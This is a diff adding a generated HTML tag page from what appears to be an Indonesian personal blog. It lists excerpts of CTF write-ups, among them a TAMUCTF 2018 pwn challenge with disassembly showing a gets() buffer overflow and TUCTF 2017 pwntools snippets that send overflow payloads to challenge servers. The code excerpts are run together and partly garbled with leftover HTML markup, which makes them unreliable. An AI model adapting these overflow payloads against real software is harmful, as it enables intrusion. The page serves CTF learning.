@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>CTF :: /home/rhama/ — Personal Blog</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content=""/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/tags/ctf/" />
+
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="CTF"/>
+<meta name="twitter:description" content=""/>
+
+
+
+<meta property="og:title" content="CTF" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="/tags/ctf/" />
+<meta property="og:site_name" content="/home/rhama/" />
+
+
+
+<link rel="alternate" type="application/rss+xml" href="/tags/ctf/index.xml" title="/home/rhama/" />
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">ls</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/showcase">Showcase</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  
+  
+  
+
+  <div class="posts">
+    
+    <div class="post on-list">
+      <h1 class="post-title"><a href="/post/2018-02-27-tamuctf-2018-pwning/">TAMUCTF 2018 - Pwning</a></h1>
+      <div class="post-meta">
+        
+        <span class="post-author">— Written by CTF.Ninja</span>
+        
+      </div>
+
+      
+        <span class="post-tags">
+          
+            #<a href="/tags/tamuctf-2018/">TAMUCTF-2018</a>&nbsp;
+          
+            #<a href="/tags/ctf/">CTF</a>&nbsp;
+          
+        </span>
+      
+
+      
+        
+          <img src="/assets/images/CTF.png" class="post-cover" />
+        
+      
+
+      <div class="post-content">
+        
+          
+            Pwn1 Diberikan sebuah file binary dengan informasi sebagai berikut
+Percobaan debugging menggunakan gdb
+$ gdb -q pwn1 Reading symbols from pwn1&hellip;(no debugging symbols found)&hellip;done. gdb-peda $ pdisass main Berikut hasil disassable fungsi main
+0x080485cf &lt;+29&gt;: call 0x8048410 &lt;setvbuf@plt&gt; 0x080485d4 &lt;+34&gt;: add esp,0x10 0x080485d7 &lt;+37&gt;: sub esp,0xc 0x080485da &lt;+40&gt;: push 0x8048700 0x080485df &lt;+45&gt;: call 0x80483f0 &lt;puts@plt&gt; 0x080485e4 &lt;+50&gt;: add esp,0x10 0x080485e7 &lt;+53&gt;: sub esp,0xc 0x080485ea &lt;+56&gt;: push 0x8048720 0x080485ef &lt;+61&gt;: call 0x80483f0 &lt;puts@plt&gt; 0x080485f4 &lt;+66&gt;: add esp,0x10 0x080485f7 &lt;+69&gt;: sub esp,0xc 0x080485fa &lt;+72&gt;: push 0x804875f 0x080485ff &lt;+77&gt;: call 0x80483f0 &lt;puts@plt&gt; 0x08048604 &lt;+82&gt;: add esp,0x10 0x08048607 &lt;+85&gt;: mov DWORD PTR [ebp-0xc],0x0 0x0804860e &lt;+92&gt;: sub esp,0xc 0x08048611 &lt;+95&gt;: lea eax,[ebp-0x23] 0x08048614 &lt;+98&gt;: push eax 0x08048615 &lt;+99&gt;: call 0x80483d0 &lt;gets@plt&gt; 0x0804861a &lt;+104&gt;: add esp,0x10 0x0804861d &lt;+107&gt;: cmp DWORD PTR [ebp-0xc],0xf007ba11 0x08048624 &lt;+114&gt;: jne 0x804862d &lt;main+123&gt; 0x08048626 &lt;+116&gt;: call 0x804854b &lt;print_flag&gt; 0x0804862b &lt;+121&gt;: jmp 0x804863d &lt;main+139&gt; 0x0804862d &lt;+123&gt;: sub esp,0xc 0x08048630 &lt;+126&gt;: push 0x8048772 0x08048635 &lt;+131&gt;: call 0x80483f0 &lt;puts@plt&gt; 0x0804863a &lt;+136&gt;: add esp,0x10 0x0804863d &lt;+139&gt;: mov eax,0x0 0x08048642 &lt;+144&gt;: mov ecx,DWORD PTR [ebp-0x4] 0x08048645 &lt;+147&gt;: leave 0x08048646 &lt;+148&gt;: lea esp,[ecx-0x4] 0x08048649 &lt;+151&gt;: ret Terlihat terdapat penggunaan fungsi gets() yang vulnerable buffer overflow.
+          
+        
+      </div>
+      
+        <div><a class="read-more button" href="/post/2018-02-27-tamuctf-2018-pwning/">Read more →</a></div>
+      
+    </div>
+    
+    <div class="post on-list">
+      <h1 class="post-title"><a href="/post/2017-12-1-tuctf-2017/">TUCTF 2017 - Write up</a></h1>
+      <div class="post-meta">
+        
+        <span class="post-author">— Written by CTF.Ninja</span>
+        
+      </div>
+
+      
+        <span class="post-tags">
+          
+            #<a href="/tags/ctf/">CTF</a>&nbsp;
+          
+        </span>
+      
+
+      
+        
+          <img src="/assets/images/CTF.png" class="post-cover" />
+        
+      
+
+      <div class="post-content">
+        
+          
+            gdb.execute(&quot;b <em>0x0000000000401c82&quot;)whileTrue:forcinchar_set:pattern=flag+c+&quot;A&quot;</em>(55-len(flag))gdb.execute(&quot;r {}“.format(pattern))foriinrange(len(flag)):gdb.execute(&quot;c&quot;)rax=gdb.execute(&quot;p/x $rax&quot;,True,True).split()[-1]ifrax==&quot;0x0&quot;:flag+=cif”}“inflag:print(&quot;Flag : %s&quot;%(flag))exit(0)print(&quot;Curret Flag : %s&quot;%(flag))sleep(1)breakprint(&quot;Pattern : %s&quot;%(pattern))print(&quot;Nilai Rax : %s&quot;%(rax))vuln=remote(&quot;vulnchat.tuCTF.com&quot;,4141)payload=&quot;A&quot;20+p32(0x00007325)# overwrite with “%s&quot;vuln.sendlineafter(&quot;Enter your username: “,payload)payload2=&quot;A&quot;49+p32(0x804856b)vuln.sendlineafter(”: “,payload2)printvuln.recvall()flag=&quot;\x72&quot;vuln2=remote(&quot;vulnchat2.tuCTF.com&quot;,4242)vuln2.sendlineafter(&quot;Enter your username: “,&quot;AAAA&quot;)vuln2.recvuntil(&quot;AAAA: “)payload=&quot;A&quot;*43+flagvuln2.send(payload)printvuln2.recv(1024)never=remote(&quot;neverending.tuCTF.com&quot;,12345)char_set=&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 !&quot;#$%&amp;'()*+,-./:;&lt;=&gt;?@[]^_`{|}~&lt;/span&gt;s&quot;defround1(char=&quot;A&quot;):never.sendlineafter(&quot;text:“,char)enc_base=never.recvline().split(&quot;is “)[1]enc_msg=never.recvline().split(&quot;is “)[1]enc_msg=enc_msg.split(” decrypted?\n&quot;)[0]log.info(&quot;ENC BASE : -&gt; {}“.format(enc_base))log.info(&quot;ENC MSG : -&gt; {}“.format(enc_msg))cal=ord(char)-ord(enc_base[0])dec=&quot;“.join([chr(ord(b)+cal)forbinenc_msg])&lt;span class=&quot;n&quot;&gt;non_printable&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;printable&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.
+          
+        
+      </div>
+      
+        <div><a class="read-more button" href="/post/2017-12-1-tuctf-2017/">Read more →</a></div>
+      
+    </div>
+    
+    <div class="post on-list">
+      <h1 class="post-title"><a href="/post/2017-11-27-tuctf-2017/">TUCTF 2017 - Writeup</a></h1>
+      <div class="post-meta">
+        
+        <span class="post-author">— Written by Aiden Pearce</span>
+        
+      </div>
+
+      
+        <span class="post-tags">
+          
+            #<a href="/tags/tuctf2017/">tuctf2017</a>&nbsp;
+          
+            #<a href="/tags/ctf/">CTF</a>&nbsp;
+          
+        </span>
+      
+
+      
+        
+          <img src="/assets/images/ctf.png" class="post-cover" />
+        
+      
+
+      <div class="post-content">
+        
+          
+            Reversing 200 (Unknown) Diberikan file ELF 64 bit stripped.
+Berikut hasil disassembly fungsi main
+signed __int64 __fastcall main(int a1, char **a2, char **a3) { signed __int64 result; // rax@2  unsigned int i; // [sp+14h] [bp-Ch]@5  char *v5; // [sp+18h] [bp-8h]@5  if ( a1 == 2 ) { if ( strlen(a2[1]) == 56 ) { v5 = a2[1]; for ( i = 0; i &lt; 0x38; ++i ) { if ( (unsigned int)sub_401E90((__int64)v5, i) ) dword_603084 = 1; } if ( dword_603084 ) puts(&quot;Nope.
+          
+        
+      </div>
+      
+        <div><a class="read-more button" href="/post/2017-11-27-tuctf-2017/">Read more →</a></div>
+      
+    </div>
+    
+    <div class="post on-list">
+      <h1 class="post-title"><a href="/post/2017-11-06-cyber-jawara-2017/">Write Up Cyber Jawara 2017</a></h1>
+      <div class="post-meta">
+        
+        <span class="post-author">— Written by Aiden Pearce</span>
+        
+      </div>
+
+      
+        <span class="post-tags">
+          
+            #<a href="/tags/cyber-jawara2017/">cyber-jawara2017</a>&nbsp;
+          
+            #<a href="/tags/ctf/">CTF</a>&nbsp;
+          
+        </span>
+      
+
+      
+        
+          <img src="/assets/images/ctf.png" class="post-cover" />
+        
+      
+
+      <div class="post-content">
+        
+          
+        
+      </div>
+      
+        <div><a class="read-more button" href="/post/2017-11-06-cyber-jawara-2017/">Read more →</a></div>
+      
+    </div>
+    
+    <div class="pagination">
+  <div class="pagination__buttons">
+    
+      <span class="button previous">
+        <a href="/tags/ctf/page/5/">
+          <span class="button__icon">←</span>
+          <span class="button__text">Newer posts</span>
+        </a>
+      </span>
+    
+    
+  </div>
+</div>
+
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">ls</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
